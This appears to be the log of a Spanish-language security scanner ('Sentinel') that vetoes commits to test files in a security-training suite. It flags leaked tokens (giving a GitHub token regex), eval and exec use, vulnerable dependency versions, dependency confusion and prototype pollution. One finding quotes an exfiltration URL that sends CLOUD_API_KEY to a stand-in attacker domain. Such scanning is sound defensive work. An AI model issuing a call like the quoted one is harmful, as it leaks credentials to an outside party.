
=== SENTINEL VETO REPORT ===

[CRITICAL]	Exposición de Secreto Crítico Detectado -> (?:ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{36}
	Ubicación: test-secret.ts
	Solución : Eliminar el secreto expuesto inmediatamente y usar variables de entorno.

Fecha: 2026-04-15T20:49:06.896Z


=== SENTINEL VETO REPORT ===

[CRITICAL]	AST INTERVENTION: Ejecución de Código Arbitrario (eval).
	Ubicación: test-secret.ts:1
	Solución : El uso de `eval` compromete la seguridad y causa RCE. Sentinel ha vetado el commit.

Fecha: 2026-04-15T20:49:17.954Z



### INTRUSIÓN DETECTADA: 2026-04-15T20:53:26.118Z

=== SENTINEL SUPREME REPORT ===

[CRITICAL]	LIBRERÍA INFECTADA/VULNERABLE: express@3.0.0 tiene 4 vulnerabilidades reportadas en OSV.
	Ubicación: test-package.json
	Solución : Actualizar express o buscar alternativa segura.


### INTRUSIÓN DETECTADA: 2026-04-15T20:53:51.459Z

=== SENTINEL SUPREME REPORT ===

[CRITICAL]	EXPOSICIÓN DE SECRETO: Firma detectada vinculada a servicios externos o credenciales.
	Ubicación: test-leak.ts
	Solución : Eliminar la cadena y usar EnvOracle.


### INTRUSIÓN DETECTADA: 2026-04-15T20:53:59.903Z

=== SENTINEL SUPREME REPORT ===

[CRITICAL]	ARCHIVO PROHIBIDO DETECTADO: Los archivos sensibles de configuración o llaves no deben estar en staging.
	Ubicación: test.env
	Solución : Añadir este archivo a .gitignore y encriptar los secretos.


### INTRUSIÓN DETECTADA: 2026-04-15T21:01:43.439Z

=== SENTINEL SUPREME REPORT ===

[WARNING]	AST VIGILANCE: Uso de Shell Externo (exec).
	Ubicación: Sognatore/scratch/test-sandbox.ts:10
	Solución : Asegurar sanitización total de argumentos.

[WARNING]	AST VIGILANCE: Uso de Shell Externo (exec).
	Ubicación: Sognatore/scratch/test-sandbox.ts:14
	Solución : Asegurar sanitización total de argumentos.

[WARNING]	AST VIGILANCE: Uso de Shell Externo (exec).
	Ubicación: Sognatore/scratch/test-sandbox.ts:18
	Solución : Asegurar sanitización total de argumentos.

[WARNING]	AST VIGILANCE: Uso de Shell Externo (exec).
	Ubicación: Sognatore/scratch/test-sandbox.ts:22
	Solución : Asegurar sanitización total de argumentos.

[WARNING]	AST VIGILANCE: Uso de Shell Externo (exec).
	Ubicación: Sognatore/scratch/test-sandbox.ts:27
	Solución : Asegurar sanitización total de argumentos.

[CRITICAL]	EXPOSICIÓN DE SECRETO: Firma detectada vinculada a servicios externos o credenciales.
	Ubicación: test-leak-final.ts
	Solución : Eliminar la cadena y usar EnvOracle.


### INTRUSIÓN DETECTADA: 2026-04-16T19:53:11.420Z

=== SENTINEL SUPREME REPORT ===

[CRITICAL]	LIBRERÍA INFECTADA/VULNERABLE: minimist@1.2.0 tiene 2 vulnerabilidades reportadas en OSV.
	Ubicación: tests/security_training/aggressive/package.json
	Solución : Actualizar minimist o buscar alternativa segura.

[CRITICAL]	LIBRERÍA INFECTADA/VULNERABLE: lodash@4.17.15 tiene 6 vulnerabilidades reportadas en OSV.
	Ubicación: tests/security_training/aggressive/package.json
	Solución : Actualizar lodash o buscar alternativa segura.


### INTRUSIÓN DETECTADA: 2026-04-16T19:58:57.796Z

=== SENTINEL SUPREME REPORT ===

[CRITICAL]	LIBRERÍA INFECTADA/VULNERABLE: express@4.18.2 tiene 2 vulnerabilidades reportadas en OSV.
	Ubicación: tests/security_training/level_3/round_9/package.json
	Solución : Actualizar express o buscar alternativa segura.

[CRITICAL]	POSIBLE DEPENDENCY CONFUSION: El paquete interno @sogna/core-utils usa una versión sospechosamente alta (99.0.0).
	Ubicación: tests/security_training/level_3/round_9/package.json
	Solución : Asegurar que el paquete se instala desde el registry privado.


### INTRUSIÓN DETECTADA: 2026-04-16T19:59:36.769Z

=== SENTINEL SUPREME REPORT ===

[CRITICAL]	ESTRUCTURA DE RIESGO: Bucle for...in detectado sin validación hasOwnProperty. Posible Prototype Pollution en utilidad de merge.
	Ubicación: tests/security_training/level_3/round_11_pollution.js:5
	Solución : Añadir filtro para __proto__ y constructor, o usar if(Object.prototype.hasOwnProperty.call(source, key)).


### INTRUSIÓN DETECTADA: 2026-04-16T19:59:59.949Z

=== SENTINEL SUPREME REPORT ===

[CRITICAL]	SOSPECHA DE EXFILTRACIÓN: Llamada de red con destino dinámico o externo no autorizado (attackerHost).
	Ubicación: tests/security_training/level_3/round_12_exfiltration.js:16
	Solución : Añadir el dominio a la lista blanca o usar constantes para URLs externas.

[CRITICAL]	SOSPECHA DE EXFILTRACIÓN: Llamada de red con destino dinámico o externo no autorizado (`http://collect.predatore-hacker.com/log?data=${CLOUD_API_KEY}`).
	Ubicación: tests/security_training/level_3/round_12_exfiltration.js:21
	Solución : Añadir el dominio a la lista blanca o usar constantes para URLs externas.
